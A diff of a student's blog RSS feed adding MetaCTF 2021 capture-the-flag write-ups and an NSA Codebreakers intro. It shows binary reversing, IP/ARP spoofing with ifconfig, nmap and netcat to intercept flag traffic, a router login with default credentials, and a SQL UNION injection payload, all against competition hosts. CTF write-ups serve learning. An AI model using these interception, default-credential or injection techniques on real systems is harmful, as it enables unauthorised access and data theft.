@@ -1,4 +1,12 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>writeups on murphe22</title><link>https://murphe22.com/tags/writeups/</link><description>murphe22 (writeups)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 11 Mar 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://murphe22.com/tags/writeups/index.xml" rel="self" type="application/rss+xml"/><item><title>NSA Codebreakers 2021</title><link>https://murphe22.com/posts/markdown-syntax/</link><pubDate>Mon, 11 Mar 2019 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/markdown-syntax/</guid><description>&lt;h1 id="task-1" >Task 1
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>writeups on murphe22</title><link>https://murphe22.com/tags/writeups/</link><description>murphe22 (writeups)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 04 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://murphe22.com/tags/writeups/index.xml" rel="self" type="application/rss+xml"/><item><title>NSA Codebreakers 2021</title><link>https://murphe22.com/posts/nsacodebreaker/</link><pubDate>Tue, 04 Jan 2022 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/nsacodebreaker/</guid><description>&lt;p>The 2021 Codebreaker Challenge consists of a series of tasks that are worth a varying amount of points based upon their difficulty. Schools will be ranked according to the total number of points accumulated by their students. Solutions may be submitted at any time for the duration of the Challenge.&lt;/p>
+&lt;h1 id="intro" >Intro
+&lt;span>
+&lt;a href="#intro">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>NSA Codebreakers was quite a competition, but it was so fun. We had never been very involved with it until this year. Jonathan, Teddy, and I spearheaded recruitment for Codebreakers and we ended up getting almost 400 people from A&amp;amp;M to sign-up! As a university, we ended up in &lt;code>4th place&lt;/code>. For myself, participating in NSA Codebreakers was a great time and I learned a ton when going through the challenges.&lt;/p>
+&lt;h1 id="task-1" >Task 1
 &lt;span>
 &lt;a href="#task-1">
 &lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
@@ -413,4 +421,339 @@ uuid_length: 0010
 uuid: b'M\xa4h\xdb\x1d\xaaH\x1c\x9b\xe7\xd9\xfe\xeeB\xa46'
 magic_end: E38A5B8C
 &lt;/code>&lt;/pre>&lt;p>Then convert that to hex (in the convert.py script) and we get the hex dump :).&lt;/p>
-&lt;p>&lt;code>1553dc11170000020002170800104da468db1daa481c9be7d9feee42a436e38a5b8c&lt;/code>&lt;/p></description></item></channel></rss>
+&lt;p>&lt;code>1553dc11170000020002170800104da468db1daa481c9be7d9feee42a436e38a5b8c&lt;/code>&lt;/p></description></item><item><title>MetaCTF 2021</title><link>https://murphe22.com/posts/metactf/</link><pubDate>Fri, 03 Dec 2021 00:00:00 +0000</pubDate><guid>https://murphe22.com/posts/metactf/</guid><description>&lt;p>Starting Friday, December 3rd, 2021, MetaCTF will host it&amp;rsquo;s 7th annual virtual jeopardy-style CTF! This event is free and open to everyone, and participants can compete in teams of up to 4.&lt;/p>
+&lt;p>This CTF will challenge participants of all skill levels to learn new cybersecurity techniques and skills, with problems covering a variety of topics such as web exploitation, cryptography, binary exploitation, reverse engineering, forensics, and reconnaissance.&lt;/p>
+&lt;h1 id="intro" >Intro
+&lt;span>
+&lt;a href="#intro">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>This CTF was the first time our club has participated and it was an absolute blast. Thank you to my awesome team members (Rohan, Lane, and Bode)!!! We placed 58th overall and 25th amongst student teams!&lt;/p>
+&lt;h1 id="darryl-vault" >Darryl Vault
+&lt;span>
+&lt;a href="#darryl-vault">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>Dread Pirate Darryl has no qualms with a little bit - or a lot - of thievery, as you recently found out to your detriment. Suffice it to say his loot stash has grown quite a bit, and you find yourself down a whole bunch of valuables. This is, put simply, unacceptable. You need to rectify this situation, and returning the favor ought to do the trick.&lt;/p>
+&lt;p>As a Dread Pirate, Dread Pirate Darryl has much better things to do than remembering all of his secrets, such as raiding other innocent CTF-goers or shouting &amp;ldquo;ARRRRR&amp;rdquo; at the top of his lungs repeatedly. Darryl commissioned a secret vault program to be written for him so that when he needs to take newly acquired loot back to his lair, he can ask it where he has to go.&lt;/p>
+&lt;p>Unfortunately for Dread Pirate Darryl, the developer from whom he commissioned the vault was very proud of his work and wanted to show it off, and we here at MetaCTF have acquired a copy of it. Find Dread Pirate Darryl&amp;rsquo;s treasures! Enact your revenge!&lt;/p>
+&lt;p>Note: The flag is the password used to access the location of Dread Pirate Darryl&amp;rsquo;s treasure.&lt;/p>
+&lt;h2 id="solve" >Solve
+&lt;span>
+&lt;a href="#solve">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>First, i just ran the file to see what was going on and saw that there were four different options.
+I went to ghidra, looked at the entry, got the first argument of libc start main and renamed main
+Rebase Ghidra
+Break main and look at what it’s doing
+We have four possible inputs, right?
+1, 2 3, 4&lt;/p>
+&lt;p>Mother’s maiden name does not prompt for a password&lt;/p>
+&lt;p>The password for 2&amp;amp;3 is just chilling in strings DARRYL_IS_THE_GREATEST&lt;/p>
+&lt;p>4 asks for a password, but it doesnt output anything else. Hmmmmmmmmmmmm 👀&lt;/p>
+&lt;p>Essentially, the password is checked on three separate occasions
+We return to ghidra. Defined strings go burrrrr. “Hey, Darryl, I&amp;rsquo;m going to need your password” has three functions nearby it. Three???? hmmmmmmmmmmmmmmm&lt;/p>
+&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/message.png" alt="idek">&lt;/p>
+&lt;p>Why dont we click on those functions 👀&lt;/p>
+&lt;p>Oh cool that last one looks sexy&lt;/p>
+&lt;p>This is where i found the function i named funcwithtoomanynums. U will know it when u see it&lt;/p>
+&lt;p>Inside that, the memcmp 0x27 goooo burrrrrr&lt;/p>
+&lt;p>Let’s just fuck around in gdb and break at this memcmp with ‘aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’ bc its len is 0x27&lt;/p>
+&lt;p>Gdb go burrrrrr
+ty gdb v cool&lt;/p>
+&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/flag.png" alt="flag in memory">&lt;/p>
+&lt;h1 id="easy-as-it-is" >Easy as it is
+&lt;span>
+&lt;a href="#easy-as-it-is">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>Caleb was designing a problem for MetaCTF where the flag would be in the telnet plaintext. Unfortunately, he accidentally stopped the packet capture right before the flag was supposed to be revealed. Can you still find the flag? Note: You&amp;rsquo;ll need to decrypt in CyberChef rather than using a command line utility.&lt;/p>
+&lt;h2 id="solve-1" >Solve
+&lt;span>
+&lt;a href="#solve-1">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Get the PGP message and private key from the pcap. Put it in CyberChef and notice it is still messed up. So, mess around with the decrompression and find that &lt;code>gzip&lt;/code> works.&lt;/p>
+&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/cyberChef.png" alt="cyberchef">&lt;/p>
+&lt;p>&lt;code>MetaCTF{cleartext_private_pgp_keys}&lt;/code>&lt;/p>
+&lt;h1 id="i-hate-python" >I Hate Python
+&lt;span>
+&lt;a href="#i-hate-python">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>I hate Python, and now you will too. Find the password.&lt;/p>
+&lt;h2 id="solve-2" >Solve
+&lt;span>
+&lt;a href="#solve-2">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Scripting fun:&lt;/p>
+&lt;pre tabindex="0">&lt;code>import random
+def do_thing(a, b):
+return ((a &amp;lt;&amp;lt; 1) &amp;amp; b) ^ ((a &amp;lt;&amp;lt; 1) | b)
+def checkFlag(x, prevLen):
+random.seed(997)
+k = [random.randint(0, 256) for _ in range(len(x))]
+a = { b: do_thing(ord(c), d) for (b, c), d in zip(enumerate(x), k) }
+b = list(range(len(x)))
+random.shuffle(b)
+c = [a[i] for i in b[::-1]]
+# print(k)
+# print(c)
+kn = [47, 123, 113, 232, 118, 98, 183, 183, 77, 64, 218, 223, 232, 82, 16, 72, 68, 191, 54, 116, 38, 151, 174, 234, 127]
+valid = len(list(filter(lambda s: kn[s[0]] == s[1], enumerate(c))))
+# print(valid)
+if valid &amp;gt; prevLen:
+return True
+return False
+#random.seed(997)
+k = [random.randint(0, 256) for _ in range(25)]
+# print(k)
+#x = &amp;quot;A&amp;quot;*25
+# a = {b: do_thing(ord(c), d) for (b, c), d in zip(enumerate(x), k)}
+#kn = [47, 123, 113, 232, 118, 98, 183, 183, 77, 64, 218, 223, 232, 82, 16, 72, 68, 191, 54, 116, 38, 151, 174, 234, 127]
+# write a loop to go through all the possible ascii
+# values and do_thing it with all values in k
+currFlag = 'MetaCTF{'
+for i in range(25 - 8):
+for j in range(0, 128):
+nextFlag = currFlag + chr(j) + 'A'*(16-i)
+# print(&amp;quot;test&amp;quot;)
+print(nextFlag)
+assert(len(nextFlag) == 25)
+if checkFlag(nextFlag, len(currFlag)):
+# print(nextFlag)
+currFlag = currFlag + chr(j)
+break
+# print(currFlag)
+&lt;/code>&lt;/pre>&lt;p>&lt;code>MetaCTF{yOu_w!N_th1$_0n3}&lt;/code>&lt;/p>
+&lt;h1 id="interception-i" >Interception I
+&lt;span>
+&lt;a href="#interception-i">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>192.168.0.1 is periodically (once every 4 seconds) sending the flag to 192.168.0.2 over UDP port 8000. Go get it.
+ssh &lt;a href="mailto:ctf-1@host.cg21.metaproblems.com">ctf-1@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
+&lt;p>If you get an SSH host key error, consider using
+ssh -o &amp;ldquo;UserKnownHostsFile=/dev/null&amp;rdquo; -o &amp;ldquo;StrictHostKeyChecking=no&amp;rdquo; &lt;a href="mailto:ctf-1@host.cg21.metaproblems.com">ctf-1@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
+&lt;p>Note that the connection can take a while to initialize. It will say Granting console connection to device&amp;hellip; and then three dots will appear. After the third dot you should have a connection.&lt;/p>
+&lt;h2 id="solve-note-i-did-this-at-2-am" >Solve (Note I did this at 2 AM)
+&lt;span>
+&lt;a href="#solve-note-i-did-this-at-2-am">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Gotta do some ip spoofing.&lt;/p>
+&lt;ol>
+&lt;li>first changed ip address to spoofy&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>ifconfig eth0 192.168.0.2 netmask 255.255.255.0&lt;/code>&lt;/p>
+&lt;ol start="2">
+&lt;li>then do a lil ping to test connection and refresh arp cache so we changed the ip address&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>ping 192.168.0.1&lt;/code>&lt;/p>
+&lt;ol start="3">
+&lt;li>then do a lil nmap mappy&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>nmap -sn -PU 192.168.0.0/24&lt;/code>&lt;/p>
+&lt;ol start="4">
+&lt;li>then do a lil net catty cat&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>nc -lu 192.168.0.2 8000&lt;/code>&lt;/p>
+&lt;p>&lt;code>MetaCTF{addr3s5_r3s0lut1on_pwn4g3}&lt;/code>&lt;/p>
+&lt;h1 id="interception-ii" >Interception II
+&lt;span>
+&lt;a href="#interception-ii">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>Someone on this network is periodically sending the flag to &amp;hellip; someone else on this network, over TCP port 8000. Go get it.
+ssh &lt;a href="mailto:ctf-46ed3559da08@host.cg21.metaproblems.com">ctf-46ed3559da08@host.cg21.metaproblems.com&lt;/a> -p 7000&lt;/p>
+&lt;h2 id="solve-3" >Solve
+&lt;span>
+&lt;a href="#solve-3">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Similar process to Interception I.&lt;/p>
+&lt;ol>
+&lt;li>There are more hosts up, so let&amp;rsquo;s see what is open.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>nmap -p 8000 192.168.0.0/24 -v | grep open&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>Discovered open port 8000/tcp on 192.168.0.78
+8000/tcp open http-alt
+&lt;/code>&lt;/pre>&lt;ol start="2">
+&lt;li>Ping to test connection.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>ping 192.168.0.78&lt;/code>&lt;/p>
+&lt;ol start="3">
+&lt;li>Check interface that we gotta change&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>arp -a&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>ip-192-168-0-78.ec2.internal (192.168.0.78) at 02:42:0a:00:a3:c3 [ether] on eth0
+&lt;/code>&lt;/pre>&lt;ol start="4">
+&lt;li>Change the ip&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>ifconfig eth0 192.168.0.78 netmask 255.255.255.0&lt;/code>&lt;/p>
+&lt;ol start="5">
+&lt;li>
+&lt;p>&lt;code>ping 192.168.0.78&lt;/code> to refresh the arp cache so it does the spoofy&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Setup the netcat connection&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;code>nc -lvp 8000&lt;/code>&lt;/p>
+&lt;p>&lt;code>MetaCTF{s0_m4ny_1ps_but_wh1ch_t0_ch00s3}&lt;/code>&lt;/p>
+&lt;h1 id="interception-iii" >Interception III
+&lt;span>
+&lt;a href="#interception-iii">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>192.168.55.3 is periodically sending the flag to 172.16.0.2 over UDP port 8000. Go get it.
+By the way, I&amp;rsquo;ve been told the admins at this organization use really shoddy passwords.
+ssh &lt;a href="mailto:ctf-f36ef72cadc1@host.cg21.metaproblems.com">ctf-f36ef72cadc1@host.cg21.metaproblems.com&lt;/a> -p 7000
+Note: The password for this user is the flag from Interception I. You must finish Interception I before starting this challenge.&lt;/p>
+&lt;h2 id="solve-4" >Solve
+&lt;span>
+&lt;a href="#solve-4">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>First enumerate&amp;hellip;. &lt;code>nmap -v 192.168.0.0/24&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/I3scan.png" alt="nmap scan">&lt;/p>
+&lt;p>So&amp;hellip; telnet means we can connect to smtn&amp;hellip; we know it is a router bc usually default gateways have an end address of &amp;lt;0-9&amp;gt;.&amp;lt;0-9&amp;gt;.&amp;lt;0-9&amp;gt;.&lt;strong>1&lt;/strong>&lt;/p>
+&lt;p>Gotta identify the router&lt;/p>
+&lt;p>&lt;code>nmap -O 192.168.0.1&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code>Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 08:57 UTC
+Nmap scan report for ip-192-168-0-1.ec2.internal (192.168.0.1)
+Host is up (0.000077s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT STATE SERVICE
+23/tcp open telnet
+MAC Address: 02:42:0A:00:0F:42 (Unknown)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+&lt;/code>&lt;/pre>&lt;p>Important: &lt;strong>Linux 4.15-5.6&lt;/strong>&lt;/p>
+&lt;p>google search: routers that use Linux 4.15 - 5.6 -&amp;gt; TP-Link&lt;/p>
+&lt;p>Find root login -&amp;gt; &lt;a href="https://www.cleancss.com/router-default/TP-Link">TP Link Default Creds&lt;/a>&lt;/p>
+&lt;pre tabindex="0">&lt;code>username: root
+password: admin
+&lt;/code>&lt;/pre>&lt;p>When you get access, and do an &lt;code>ls&lt;/code>, find bird-2.0.8 -&amp;gt;
+&lt;a href="https://blog.kintone.io/entry/bird">https://blog.kintone.io/entry/bird&lt;/a> and &lt;a href="https://bird.network.cz/?get_doc&amp;amp;f=bird-4.html">https://bird.network.cz/?get_doc&amp;amp;f=bird-4.html&lt;/a>&lt;/p>
+&lt;p>Did not solve, but was ON THE RIGHT TRACK. At 4AM, I tried changing the OSPF cost BUT I CHANGED THE WRONG INTERFACE&amp;rsquo;S COST. BIG SAD.&lt;/p>
+&lt;p>Here is the writeup from another person&amp;hellip; for next time.&lt;/p>
+&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/birdShit.png" alt="solve">&lt;/p>
+&lt;h1 id="where-in-the-world" >Where in the World
+&lt;span>
+&lt;a href="#where-in-the-world">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>I must say, every time I see one of these directional signs, I think I&amp;rsquo;ve got to make this into a CTF problem. It&amp;rsquo;s the idea of Open Source Intelligence (OSINT) or Geospatial Intelligence (GEOINT). The idea of being able to take an image and use all of the clues within it to infer details such as where it&amp;rsquo;s at or what&amp;rsquo;s happening in the photo.&lt;/p>
+&lt;p>Here is one such picture of those signs. Your goal? Use those little details to find the name of the marina it&amp;rsquo;s at which you&amp;rsquo;ll submit for the flag (so MetaCTF{name of marina}&lt;/p>
+&lt;p>&lt;img src="https://murphe22.com/content/posts/images/metactf/sign_of_cities.png" alt="picture">&lt;/p>
+&lt;h2 id="solve-5" >Solve
+&lt;span>
+&lt;a href="#solve-5">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Google image search go brrrr.&lt;/p>
+&lt;p>&lt;a href="https://www.google.com/search?tbs=simg:CAESYgm4egF4qbenjhpXCxCwjKcIGjsKOQgEEhSLHvcB1A2jDM8esSSJJsYRqS2wGhobsSNyV5t0GyxbYWZWX4cdF4DSw67Sa_1SydHZ0IAUwBAwLEI6u_1ggaCgoICAESBAXC5ToM&amp;amp;q=marina+&amp;amp;tbm=isch#imgrc=lI4Z2r9ahay2oM">Search&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.google.com/url?sa=i&amp;amp;url=https%3A%2F%2Fwww.facebook.com%2FEgg-Harbor-Marina-Beach-206274509466545%2F&amp;amp;psig=AOvVaw19faRmXpPwUl5JjE_6oYTM&amp;amp;ust=1638681451821000&amp;amp;source=images&amp;amp;cd=vfe&amp;amp;ved=0CAwQjhxqFwoTCJCsmqGyyfQCFQAAAAAdAAAAABAD">Egg Harbor&lt;/a>&lt;/p>
+&lt;p>&lt;code>MetaCTF(egg_harbor)&lt;/code>&lt;/p>
+&lt;h1 id="yummy-vegetables" >Yummy Vegetables
+&lt;span>
+&lt;a href="#yummy-vegetables">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h1>&lt;p>I love me my vegetables, but I can never remember what color they are! I know lots of people have this problem, so I made a site to help.&lt;/p>
+&lt;p>Here&amp;rsquo;s some sauce to go with the vegetables: index.js&lt;/p>
+&lt;h2 id="solve-6" >Solve
+&lt;span>
+&lt;a href="#solve-6">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Looking at the JS, we see that a query is sent so you can do a UNION attack on this boi.&lt;/p>
+&lt;p>Make sure you have the same number of columns as the first query though.&lt;/p>
+&lt;p>To find the number of columns, look at the response after submitting a query (we can just do a empty search).&lt;/p>
+&lt;p>&lt;code>UNION SELECT 1, 2, flag FROM the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5;--1&lt;/code>&lt;/p>
+&lt;p>&lt;code>MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}&lt;/code>&lt;/p>
+&lt;h1 id="the-best-laid-plain" >The Best Laid Plain
+&lt;span>
+&lt;a href="#the-best-laid-plain">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
